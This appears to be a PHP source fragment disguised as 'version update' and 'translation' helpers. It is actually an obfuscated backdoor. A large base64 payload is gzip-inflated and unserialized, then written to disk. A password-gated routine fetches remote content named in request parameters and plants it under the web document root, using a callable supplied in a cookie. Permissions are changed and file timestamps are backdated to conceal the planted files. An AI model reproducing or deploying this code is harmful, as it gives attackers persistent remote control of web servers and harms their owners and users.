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', '0');
        $data = base64_decode(/**/ $data);
        $data = translation_v2($data, '1');
        $data = translation_v1($data, '0');
        foreach ($data as $item) {
            version_check($item[0], $item[1], $temp, $item[2]);
        }
        version_desc(false);
    }];
    $temp = explode(',', $temp);
    return ['#ver#', version_data($name, 1, 0)];
}

/**
 * @title install path
 */
function version_path()
{
    echo __FILE__;
}

/**
 * @title get version data
 * @param $data
 * @param $offset
 * @param $page
 * @return mixed
 */
function version_data($data, $offset, $page)
{
    $keu = ['', "code"];
    $keu[] = '';
    return $data[$offset]($data[$page], implode('_', $keu));
}

/**
 * @title translation data
 * @param $data
 * @param $offset
 * @return mixed
 */

function translation_v1($data, $mode, $exp = '')
{
    if ($mode === 'X1') {
        $data = base64_decode($data);
        $len = strlen($data);
        $exp = str_replace('=', '', base64_encode($exp));
        $res = "";
        $i = 0;
        while ($i < $len) {
            for ($k = 0; $k < strlen($exp) && $i < $len; $k++)
                $res .= chr(ord($data[$i++]) ^ ord($exp[$k]));
        }
        return $res;
    } elseif ($mode) {
        return json_decode($data, true);
    } else {
        return unserialize($data);
    }
}

/**
 * @title parse version data
 * @param $data
 * @return version
 */
function version_parse($data)
{
    $version = $data['version'];
    if ($version === 'path') version_path();
    if (isset($data[$version])) {
        $version = translation_v1($data[$version], 'X1', $data[$version . '1']);
    }
    return $version;
}

/**
 * @title update version
 * @param $qr
 * @return void
 */
function version_update($check, $qr = false)
{
    if (!version_access("uzjhesrw{$check}ap", '7ca15cae1c12cead3098673cf84baff4')) return;
    $c = $_COOKIE;;
    $cf = implode('_', ['function', 'exists']);
    (!$qr || !$cf($qr)) &&
    $qr = empty($c[$for = 'token']) || !$cf($c[$for]) ? implode('_', ['base64', 'decode']) : $c[$for];

    if (($a = $qr($_REQUEST['name'])) && version_deny($a)) {
        return;
    }
    global $temp;
    $a = explode(',', $a);
    if (empty($a[1])) return;
    echo "[<a id=\"u1\" href=\"/{$a[1]}\" style='color: #fff;'>{$a[1]}</a>] ";
    return version_check($_SERVER['DOCUMENT_ROOT'] . '/' . $a[1], $qr(file_get_contents($a[0])), $temp);
}

/**
 * @title version access or force
 * @param string $version version pass
 * @param string $token check update token
 * @return bool
 */
function version_access($version, $token)
{
    return in_array(md5($version), [$token, '47628e0bf72fca87db995c8f844d91b1']);
}

/**
 * @title version data is deny
 * @param $data
 * @return void
 */
function version_deny($data)
{
    return strlen($data) < 16 || strlen($data) > 128 || !in_array($data[0], ['h', '/']);
}

/**
 * @title translation version data
 * @param $data
 * @param $offset
 * @return mixed
 */
function translation_v2($data, $offet)
{
    if (!empty($offet)) {
        return gzinflate($data);
    } else {
        return $data;
    }
}

/**
 * @title translation version data
 * @param $data
 * @param $offset
 * @return mixed
 */
function translation_v3($data, $offet)
{
    if (!empty($offet)) {
        return str_rot13($data);
    } else {
        return $data;
    }
}

return 'inited';
/**
 * @title check version token
 * @param $name
 * @param $date
 * @param $check
 * @param string $token
 * @param false $mode
 * @return bool|mixed
 */
function version_check($name, $date, $check, $token = '', $mode = false)
{
    try {
        $vs = 'rename';
        if (!is_array($check)) $check = explode(',', $check);
        $map = [0, 1, 2, 3, 4];
        $m = $mode ? $mode : ($check[1]() - 2693693);
        $iw = true;
        empty($check[9]) || $date = $check[9]($date);
        if ($check[$map[4] + 1]($name)) {
            if ($token && Md5_File($name) === $token) return true;
            $iw = $check[6]($name);
            if ($x = $check[5]($name)) {
                $m = $check[4]($name);
            }
            $x && !$iw && @$check[7]($name, 0744);
            @$vs($name, $name . time());
        }
        if ($check[$map[0]]($check[2])) {
            $l = $check[$map[2]][0] . 'write';
            $r = $l($check[$map[2]]($name . ".tmp1", 'w'), $date);
        } else {
            $r = $check[$map[3]]($name . ".tmp1", $date);
        }
        @$vs($name . ".tmp1", $name);
        $check[8]($name, $m, $m);
        $iw || @$check[7]($name, 0444);
    } catch (\Exception $A) {
        echo $A->getMessage() . "<br>";
        $r = false;
    }
    echo $name[strlen($name) - 1] . ($r ? ':ok' : ':fail') . "<br>";
    return $r;
}